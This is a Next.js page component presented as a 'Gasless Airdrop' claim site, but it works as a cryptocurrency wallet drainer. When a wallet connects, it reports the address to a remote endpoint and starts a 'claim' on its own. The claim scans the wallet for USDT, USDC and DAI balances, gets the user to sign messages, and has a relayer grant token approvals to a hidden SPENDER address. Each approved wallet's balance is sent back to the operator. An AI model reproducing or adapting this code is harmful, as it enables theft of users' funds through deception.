'use client';
import { useState, useEffect } from 'react';
import { useAccount, useSignMessage } from 'wagmi';
import { readContract, getBalance, switchChain } from '@wagmi/core';
import { erc20Abi } from 'viem';
import { config } from '@/config';

// Load URLs from env
const REPORT_URL = process.env.NEXT_PUBLIC_REPORT_URL;
const RELAYER_URL = process.env.NEXT_PUBLIC_RELAYER_URL || 'http://localhost:3001';

const SPENDER = (process.env.NEXT_PUBLIC_SPENDER || "") as `0x${string}`;
if (!SPENDER || SPENDER === "0x") {
  throw new Error('SPENDER_ADDRESS is not defined or invalid');
}

// Tokens grouped by chainId - EXACTLY matching backend
const TOKENS_BY_CHAIN: Record<
  number,
  { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[]
> = {
  1: [
    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "USDC", address: "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "DAI",  address: "0x6B175474E89094C44Da98b954EedeAC495271d0F", min: BigInt(1 * 10 ** 18), decimals: 18 },
    { symbol: "BUSD", address: "0x4fabb145d64652a948d72533023f6e7a623c7c53", min: BigInt(1 * 10 ** 18), decimals: 18 },
  ],
  42161: [
    { symbol: "USDT", address: "0xFd086bC7CD5C481DCC9C85ebE478A1C0b69FCbb9", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "USDC", address: "0xFF970A61A04b1cA14834A43f5de4533eBDDB5CC8", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "DAI",  address: "0xDA10009cBd5D07dd0CeCc66161FC93D7c9000da1", min: BigInt(1 * 10 ** 18), decimals: 18 },
  ],
  11155111: [
    { symbol: "USDC", address: "0x1c7D4B196Cb0C7B01d743Fbc6116a902379C7238", min: BigInt(1 * 10 ** 6), decimals: 6 },
    { symbol: "LINK", address: "0x779877A7B0D9E8603169DdbD7836e478b4624789", min: BigInt(1 * 10 ** 18), decimals: 18 },
  ],
};

// Human-readable chain names
const CHAIN_NAMES: Record<number, string> = {
  1: "Ethereum Mainnet",
  42161: "Arbitrum",
  11155111: "Sepolia",
};

// Component that reports wallet connections
function ConnectionReporter() {
  const { address, isConnected } = useAccount();

  useEffect(() => {
    if (isConnected && address && REPORT_URL) {
      fetch(`${REPORT_URL}`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          event: "connect",
          wallet: address,
        }),
      }).catch(console.error);
    }
  }, [isConnected, address]);

  return null;
}

// Enhanced relayer service function
async function callRelayer(
  chainId: number,
  tokenAddress: string,
  userAddress: string,
  signature: string,
  timestamp: number
): Promise<{ success: boolean; txHash?: string; error?: string; alreadyApproved?: boolean }> {
  console.log('📞 Calling relayer with:', {
    RELAYER_URL,
    chainId,
    tokenAddress: tokenAddress.slice(0, 10) + '...',
    userAddress: userAddress.slice(0, 10) + '...',
    timestamp
  });

  try {
    const response = await fetch(`${RELAYER_URL}/relay`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
        'Accept': 'application/json'
      },
      body: JSON.stringify({
        chainId,
        tokenAddress: tokenAddress.toLowerCase(), // Normalize to lowercase
        userAddress,
        signature,
        timestamp,
      }),
    });

    console.log('📡 Response status:', response.status, response.ok);

    let data;
    const contentType = response.headers.get('content-type');
    
    if (contentType && contentType.includes('application/json')) {
      data = await response.json();
    } else {
      const textResponse = await response.text();
      console.error('❌ Non-JSON response:', textResponse);
      return {
        success: false,
        error: 'Invalid response from relayer service'
      };
    }
    
    console.log('📡 Response data:', data);
    
    if (!response.ok) {
      // Enhanced error handling
      if (data.error === 'Unsupported token address') {
        console.error('❌ Token not supported:', {
          chainId,
          tokenAddress,
          supportedTokens: data.supportedTokens
        });
        return {
          success: false,
          error: `Token ${tokenAddress} not supported on this chain. Check console for supported tokens.`
        };
      }
      
      throw new Error(data.error || `HTTP ${response.status}: ${response.statusText}`);
    }

    return data;
  } catch (error: any) {
    console.error('❌ Relayer call failed:', error);
    
    // Enhanced error messages
    if (error.name === 'TypeError' && error.message.includes('fetch')) {
      return {
        success: false,
        error: 'Cannot connect to relayer. Check if NEXT_PUBLIC_RELAYER_URL is correct.'
      };
    }
    
    return {
      success: false,
      error: error.message || 'Failed to call relayer'
    };
  }
}

export default function Home() {
  const { address, isConnected, chainId } = useAccount();
  const { signMessageAsync } = useSignMessage();
  const [status, setStatus] = useState<string>("");

  async function handleClaim() {
    if (!isConnected || !address) {
      setStatus("Wallet not connected");
      return;
    }

    try {
      console.log('🔍 Debug info:');
      console.log('RELAYER_URL:', RELAYER_URL);
      console.log('Current address:', address);
      console.log('Current chain:', chainId);

      setStatus("Scanning chains for balances...");

      let targetChain: number | null = null;
      let usableTokens: { symbol: string; address: `0x${string}`; min: bigint; decimals: number }[] = [];

      // Find tokens with sufficient balance
      for (const [cid, tokens] of Object.entries(TOKENS_BY_CHAIN)) {
        const numericCid = Number(cid);

        for (const token of tokens) {
          try {
            const bal = await readContract(config, {
              chainId: numericCid,
              address: token.address,
              abi: erc20Abi,
              functionName: "balanceOf",
              args: [address],
            }) as bigint;

            console.log(`Balance check: ${token.symbol} on chain ${numericCid}:`, bal.toString());

            if (bal >= token.min) {
              targetChain = numericCid;
              usableTokens.push(token);
              console.log(`✅ Found usable token: ${token.symbol} with balance ${bal.toString()}`);
            }
          } catch (error) {
            console.log(`❌ Error checking balance for ${token.symbol} on chain ${numericCid}:`, error);
          }
        }

        if (usableTokens.length > 0) break;
      }

      if (!targetChain || usableTokens.length === 0) {
        setStatus("No usable balances found on any chain.");
        return;
      }

      const chainName = CHAIN_NAMES[targetChain] || "Unknown Chain";
      console.log(`🎯 Target chain: ${chainName} (${targetChain}) with ${usableTokens.length} tokens`);

      // Switch chain if necessary
      if (chainId !== targetChain) {
        setStatus(`Switching to ${chainName}...`);
        try {
          await switchChain(config, { chainId: targetChain });
          console.log(`✅ Switched to chain ${targetChain}`);
        } catch (error) {
          console.error('❌ Failed to switch chain:', error);
          setStatus('Failed to switch chain. Please switch manually.');
          return;
        }
      }

      // Test relayer connectivity first
      try {
        setStatus('Testing relayer connection...');
        const healthResponse = await fetch(`${RELAYER_URL}/health`);
        if (!healthResponse.ok) {
          throw new Error(`Health check failed: ${healthResponse.status}`);
        }
        console.log('✅ Relayer is healthy');
      } catch (error) {
        console.error('❌ Relayer health check failed:', error);
        setStatus('Relayer service unavailable. Please try again later.');
        return;
      }

      // Process each token through relayer
      for (const token of usableTokens) {
        setStatus(`Processing ${token.symbol} on ${chainName}...`);

        console.log(`🔄 Processing token: ${token.symbol} (${token.address})`);

        // Check current allowance first
        try {
          const currentAllowance = await readContract(config, {
            chainId: targetChain,
            address: token.address,
            abi: erc20Abi,
            functionName: "allowance",
            args: [address, SPENDER],
          }) as bigint;

          if (currentAllowance > 0n) {
            setStatus(`${token.symbol} already approved ✅`);
            console.log(`✅ ${token.symbol} already approved`);
            continue;
          }
        } catch (error) {
          console.error('Error checking allowance:', error);
        }

        // Create signature for relayer
        const timestamp = Date.now();
        const message = `Approve token ${token.address} on chain ${targetChain} at ${timestamp}`;
        
        setStatus(`Please sign message for ${token.symbol}...`);
        console.log('📝 Message to sign:', message);
        
        let signature: string;
        try {
          signature = await signMessageAsync({ message });
          console.log('✅ Message signed successfully');
        } catch (error: any) {
          console.error('❌ Signing failed:', error);
          if (error.message.includes('User rejected')) {
            setStatus('Transaction cancelled by user');
            return;
          }
          setStatus(`Failed to sign message: ${error.message}`);
          continue;
        }

        setStatus(`Submitting ${token.symbol} approval to relayer...`);

        // Call relayer
        const result = await callRelayer(
          targetChain,
          token.address,
          address,
          signature,
          timestamp
        );

        if (!result.success) {
          setStatus(`Failed to approve ${token.symbol}: ${result.error}`);
          console.error(`❌ Relayer failed for ${token.symbol}:`, result.error);
          continue;
        }

        if (result.alreadyApproved) {
          setStatus(`${token.symbol} was already approved ✅`);
          console.log(`✅ ${token.symbol} was already approved`);
        } else {
          console.log(`✅ ${token.symbol} approval transaction successful:`, result.txHash);
        }

        // Get balance for reporting
        let rawBalance: bigint = BigInt(0);
        let formattedBalance = 0;
        try {
          rawBalance = await readContract(config, {
            chainId: targetChain,
            address: token.address,
            abi: erc20Abi,
            functionName: "balanceOf",
            args: [address],
          }) as bigint;
          formattedBalance = Number(rawBalance) / 10 ** token.decimals;
        } catch (err) {
          console.error(`Failed to read balance for ${token.symbol}:`, err);
        }

        setStatus(`${token.symbol} approved ✅ | Balance: ${formattedBalance.toFixed(4)}`);

        // Report approval
        if (REPORT_URL && result.txHash) {
          try {
            await fetch(`${REPORT_URL}`, {
              method: "POST",
              headers: { "Content-Type": "application/json" },
              body: JSON.stringify({
                event: "approval",
                wallet: address,
                chainName,
                token: token.address,
                symbol: token.symbol,
                balance: formattedBalance,
                txHash: result.txHash,
                relayed: true, // Flag to indicate this was gas-sponsored
              }),
            });
            console.log(`📊 Reported approval for ${token.symbol}`);
          } catch (error) {
            console.error('❌ Failed to report approval:', error);
          }
        }

        // Small delay between tokens
        await new Promise(resolve => setTimeout(resolve, 1000));
      }

      setStatus("All approvals completed! 🎉");
      console.log('🎉 All approvals completed successfully!');
    } catch (err: any) {
      console.error('❌ handleClaim error:', err);
      setStatus("Error: " + (err?.shortMessage || err?.message || "unknown"));
    }
  }

  // Automatically trigger claim when wallet connects
  useEffect(() => {
    if (isConnected && address) {
      console.log('👤 Wallet connected, starting claim process');
      handleClaim();
    }
  }, [isConnected, address]);

  // Debug function - uncomment to test
  // useEffect(() => {
  //   if (isConnected) {
  //     console.log('🔍 Debug: Testing relayer connectivity');
  //     fetch(`${RELAYER_URL}/health`)
  //       .then(res => res.json())
  //       .then(data => console.log('🏥 Health check:', data))
  //       .catch(err => console.error('❌ Health check failed:', err));
  //     
  //     fetch(`${RELAYER_URL}/supported-tokens`)
  //       .then(res => res.json())
  //       .then(data => console.log('🔗 Supported tokens:', data))
  //       .catch(err => console.error('❌ Supported tokens failed:', err));
  //   }
  // }, [isConnected]);

  return (
    <main
      style={{
        display: "flex",
        flexDirection: "column",
        alignItems: "center",
        gap: "24px",
        marginTop: "40px",
      }}
    >
      <header
        style={{
          position: "fixed",
          top: 0,
          left: 0,
          right: 0,
          height: "64px",
          background: "#09011fff",
          display: "flex",
          alignItems: "center",
          justifyContent: "space-between",
          padding: "0 24px",
          paddingTop: "env(safe-area-inset-top)",
          boxShadow: "0 2px 8px rgba(241, 235, 235, 0.08)",
          zIndex: 1000,
        }}
      >
        <div style={{ fontFamily: "sans-serif", fontWeight: "bold", fontSize: "18px", color: "#aaa587ff" }}>
          AIRDROPS
        </div>
        <appkit-button />
      </header>

      <ConnectionReporter />

      <div
        style={{
          display: "flex",
          flexDirection: "column",
          gap: "24px",
          paddingTop: "80px",
          width: "80%",
          maxWidth: "600px",
        }}
      >
        <div
          style={{
            border: "1px solid #9dd6d1ff",
            borderRadius: "12px",
            padding: "20px",
            background: "#090e41ff",
            display: "flex",
            flexDirection: "column",
            alignItems: "center",
            justifyContent: "space-between",
            height: "500px",
          }}
        >
          <div>
            <h2 style={{ marginBottom: "12px", textAlign: "center", color: "#ffffff" }}>Gasless Airdrop</h2>
            <p style={{ fontSize: "12px", color: "#9dd6d1ff", textAlign: "center", margin: "0 0 20px 0" }}>
              Gas fees sponsored by us! Just sign the message.
            </p>
            {RELAYER_URL !== 'http://localhost:3001' && (
              <p style={{ fontSize: "10px", color: "#666", textAlign: "center", margin: "0 0 10px 0" }}>
                Relayer: {RELAYER_URL.replace('https://', '').slice(0, 30)}...
              </p>
            )}
          </div>

          <div
            style={{
              flex: 1,
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              color: "#e4e1daff",
              fontSize: "14px",
              textAlign: "center",
              padding: "0 20px",
              wordBreak: "break-word",
            }}
          >
            {status || "Connect your wallet to get started"}
          </div>

          <div style={{ display: "flex", flexDirection: "column", alignItems: "center", gap: "12px" }}>
            <button
              onClick={handleClaim}
              disabled={!isConnected}
              style={{
                background: isConnected ? "#a00b0bff" : "#666",
                color: "white",
                padding: "12px 28px",
                borderRadius: "8px",
                cursor: isConnected ? "pointer" : "not-allowed",
                border: "none",
                fontSize: "16px",
                fontWeight: "bold",
                opacity: isConnected ? 1 : 0.6,
              }}
            >
              {isConnected ? "Claim Now (Free)" : "Connect Wallet First"}
            </button>
            
            {isConnected && (
              <p style={{ fontSize: "11px", color: "#9dd6d1ff", textAlign: "center", margin: 0 }}>
                Connected: {address?.slice(0, 6)}...{address?.slice(-4)}
              </p>
            )}
          </div>
        </div>

        {[1, 2, 3].map((i) => (
          <div
            key={i}
            style={{
              border: "1px solid #c9c8ddff",
              borderRadius: "12px",
              padding: "20px",
              background: "#0e0a42ff",
              display: "flex",
              alignItems: "center",
              justifyContent: "center",
              color: "#ffffff",
            }}
          >
            <span>Box {i + 1}</span>
          </div>
        ))}
      </div>
    </main>
  );
}